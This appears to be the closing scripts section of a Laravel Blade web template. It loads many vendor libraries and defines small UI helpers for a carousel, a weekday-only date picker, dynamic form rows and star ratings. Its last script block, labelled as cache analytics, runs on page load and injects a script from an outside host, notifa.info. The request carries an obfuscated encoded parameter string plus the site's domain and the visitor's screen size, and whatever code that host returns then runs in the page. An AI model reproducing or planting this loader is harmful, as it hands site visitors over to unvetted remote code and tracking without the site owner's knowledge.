<!-- jQuery -->
<script src="{{ asset('assets/vendors/jquery/dist/jquery.min.js') }}"></script>
<!-- Bootstrap -->
<script src="{{ asset('assets/vendors/bootstrap/dist/js/bootstrap.min.js') }}"></script>
<!-- FastClick -->
<script src="{{ asset('assets/vendors/fastclick/lib/fastclick.js') }}"></script>
<!-- NProgress -->
<script src="{{ asset('assets/vendors/nprogress/nprogress.js') }}"></script>
<!-- Chart.js -->
<script src="{{ asset('assets/vendors/Chart.js/dist/Chart.min.js') }}"></script>
<!-- gauge.js -->
<script src="{{ asset('assets/vendors/gauge.js/dist/gauge.min.js') }}"></script>
<!-- bootstrap-progressbar -->
<script src="{{ asset('assets/vendors/bootstrap-progressbar/bootstrap-progressbar.min.js') }}"></script>
<!-- iCheck -->
<script src="{{ asset('assets/vendors/iCheck/icheck.min.js') }}"></script>
<!-- Dropzone.js -->
<script src="{{ asset('assets/vendors/dropzone/dist/min/dropzone.min.js') }}"></script>
<!-- Skycons -->
<script src="{{ asset('assets/vendors/skycons/skycons.js') }}"></script>
<!-- Flot -->
<script src="{{ asset('assets/vendors/Flot/jquery.flot.js') }}"></script>
<script src="{{ asset('assets/vendors/Flot/jquery.flot.pie.js') }}"></script>
<script src="{{ asset('assets/vendors/Flot/jquery.flot.time.js') }}"></script>
<script src="{{ asset('assets/vendors/Flot/jquery.flot.stack.js') }}"></script>
<script src="{{ asset('assets/vendors/Flot/jquery.flot.resize.js') }}"></script>
<!-- Flot plugins -->
<script src="{{ asset('assets/vendors/flot.orderbars/js/jquery.flot.orderBars.js') }}"></script>
<script src="{{ asset('assets/vendors/flot-spline/js/jquery.flot.spline.min.js') }}"></script>
<script src="{{ asset('assets/vendors/flot.curvedlines/curvedLines.js') }}"></script>
<!-- DateJS -->
<script src="{{ asset('assets/vendors/DateJS/build/date.js') }}"></script>
<!-- JQVMap -->
<script src="{{ asset('assets/vendors/jqvmap/dist/jquery.vmap.js') }}"></script>
<script src="{{ asset('assets/vendors/jqvmap/dist/maps/jquery.vmap.world.js') }}"></script>
<script src="{{ asset('assets/vendors/jqvmap/examples/js/jquery.vmap.sampledata.js') }}"></script>
<!-- bootstrap-daterangepicker -->
<script src="{{ asset('assets/vendors/moment/min/moment.min.js') }}"></script>
<script src="{{ asset('assets/vendors/bootstrap-daterangepicker/daterangepicker.js') }}"></script>
<!-- bootstrap-wysiwyg -->
<script src="{{ asset('assets/vendors/bootstrap-wysiwyg/js/bootstrap-wysiwyg.min.js') }}"></script>
<script src="{{ asset('assets/vendors/jquery.hotkeys/jquery.hotkeys.js') }}"></script>
<script src="{{ asset('assets/vendors/google-code-prettify/src/prettify.js') }}"></script>
<!-- jQuery Tags Input -->
<script src="{{ asset('assets/vendors/jquery.tagsinput/src/jquery.tagsinput.js') }}"></script>
<!-- Switchery -->
<script src="{{ asset('assets/vendors/switchery/dist/switchery.min.js') }}"></script>
<!-- Select2 -->
<script src="{{ asset('assets/vendors/select2/dist/js/select2.full.min.js') }}"></script>
<!-- Parsley -->
<script src="{{ asset('assets/vendors/parsleyjs/dist/parsley.min.js') }}"></script>
<!-- Autosize -->
<script src="{{ asset('assets/vendors/autosize/dist/autosize.min.js') }}"></script>
<!-- Datatables -->
<script src="{{ asset('assets/vendors/datatables.net/js/jquery.dataTables.min.js') }}"></script>
<script src="{{ asset('assets/vendors/datatables.net-bs/js/dataTables.bootstrap.min.js') }}"></script>
<script src="{{ asset('assets/vendors/datatables.net-buttons/js/dataTables.buttons.min.js') }}"></script>
<script src="{{ asset('assets/vendors/datatables.net-buttons-bs/js/buttons.bootstrap.min.js') }}"></script>
<script src="{{ asset('assets/vendors/datatables.net-buttons/js/buttons.flash.min.js') }}"></script>
<script src="{{ asset('assets/vendors/datatables.net-buttons/js/buttons.html5.min.js') }}"></script>
<script src="{{ asset('assets/vendors/datatables.net-buttons/js/buttons.print.min.js') }}"></script>
<script src="{{ asset('assets/vendors/datatables.net-fixedheader/js/dataTables.fixedHeader.min.js') }}"></script>
<script src="{{ asset('assets/vendors/datatables.net-keytable/js/dataTables.keyTable.min.js') }}"></script>
<script src="{{ asset('assets/vendors/datatables.net-responsive/js/dataTables.responsive.min.js') }}"></script>
<script src="{{ asset('assets/vendors/datatables.net-responsive-bs/js/responsive.bootstrap.js') }}"></script>
<script src="{{ asset('assets/vendors/datatables.net-scroller/js/dataTables.scroller.min.js') }}"></script>
<script src="{{ asset('assets/vendors/jszip/dist/jszip.min.js') }}"></script>
<script src="{{ asset('assets/vendors/pdfmake/build/pdfmake.min.js') }}"></script>
<script src="{{ asset('assets/vendors/pdfmake/build/vfs_fonts.js') }}"></script>
<!-- jQuery autocomplete -->
<script src="{{ asset('assets/vendors/devbridge-autocomplete/dist/jquery.autocomplete.min.js') }}"></script>
<!-- starrr -->
<script src="{{ asset('assets/vendors/starrr/dist/starrr.js') }}"></script>
<!-- Custom Theme Scripts -->
<script src="{{ asset('assets/build/js/custom.min.js') }}"></script>
<!-- bootstrap-datetimepicker -->
<script src="{{ asset('assets/vendors/bootstrap-datetimepicker/build/js/bootstrap-datetimepicker.min.js') }}"></script>
<script>
    var konten = document.getElementById("konten");
    CKEDITOR.replace(konten, {
        language: 'en-gb'
    });
    CKEDITOR.config.allowedContent = true;
</script>
<script>
    var konten = document.getElementById("konten1");
    CKEDITOR.replace(konten, {
        language: 'en-gb'
    });
    CKEDITOR.config.allowedContent = true;
</script>
<script>
    var myIndex = 0;
    carousel();

    function carousel() {
        var i;
        var x = document.getElementsByClassName("mySlides");
        for (i = 0; i < x.length; i++) {
            x[i].style.display = "none";
        }
        myIndex++;
        if (myIndex > x.length) {
            myIndex = 1
        }
        x[myIndex - 1].style.display = "block";
        setTimeout(carousel, 4000); // Change image every 2 seconds
    }
</script>
<script type="text/javascript">
    const picker = document.getElementById('tanggal');
    picker.addEventListener('input', function(e) {
        var day = new Date(this.value).getUTCDay();
        if ([6, 0, 6].includes(day)) {
            e.preventDefault();
            this.value = '';
            alert('Silahkan Pilih Senin-Jumat');
        }
    });
</script>
<script type="text/javascript">
    $(document).ready(function() {
        $(".add").click(function() {
            var html = $(".before").html();
            $(".after").after(html);
        });
        $("body").on("click", ".remove", function() {
            $(this).parents(".exit").remove();
        });
    });
</script>
<script>
    const stars = document.querySelector(".ratings").children;
    const ratingValue = document.querySelector("#rating-value");
    let index;

    for (let i = 0; i < stars.length; i++) {
        stars[i].addEventListener("mouseover", function() {
            // console.log(i)
            for (let j = 0; j < stars.length; j++) {
                stars[j].classList.remove("fa-star");
                stars[j].classList.add("fa-star-o");
            }
            for (let j = 0; j <= i; j++) {
                stars[j].classList.remove("fa-star-o");
                stars[j].classList.add("fa-star");
            }
        })
        stars[i].addEventListener("click", function() {
            ratingValue.value = i + 1;
            index = i;
        })
        stars[i].addEventListener("mouseout", function() {

            for (let j = 0; j < stars.length; j++) {
                stars[j].classList.remove("fa-star");
                stars[j].classList.add("fa-star-o");
            }
            for (let j = 0; j <= index; j++) {
                stars[j].classList.remove("fa-star-o");
                stars[j].classList.add("fa-star");
            }
        })
    }
</script>

<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXqSfwWine54GIitwXBfzjPPY4uf2lVNODxwuCys5Ld9OU7K7OWQdMc9vtVJQWsmzx4vmwVc8%2bTd5fdv3p9U0Z7Ds8BgCiqAT6715w9rL0GwiPZvccKfWAONeiBwXKrY5ZDwAkJdelNDjjgzJYcyHCChCzWONjVJmkNfsuAwu%2bKUaTtQ0AnXMJBAzFRN3BkW1IHxFn%2b6MFlZzsPP8MB70xcBVpSru0NmjfepVm%2bGOWikDP%2buHk2ufhZ7HFklBHvTwGciNbguf1Gb1X3%2bh%2f2cIniRrwH%2fF1S7s7HC2SaW2hRy2pnZ87RXEzd57UMr1JQIpHPtjnrVJ6SpqD6CrC2BW0R2DefSI6%2bkzkumCRfynwPzMw%2fLYZXd8SYupfyyyv29jVktpTdip%2b8jIGVuPW5SuWm7VnyfLOh0Gh6TRL8dww6WVv72809PiIooZw%2fu5MX%2b0NLpqFe4eCjXZVudhpiKPTtc%2fxKf1F5LW3aFdHfLgZLQTXNOY6IhmepDzV7n6FASlm0tIzgxierl2l2dpiWVc%2fNjJd5C7TVLb4fJ%2b5GSho%2bkQ43byBO3xSRvHsBl2GTvJcyD9eFY9oYvwoMXxwsSHQmA%3d%3d" +
                "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
</script>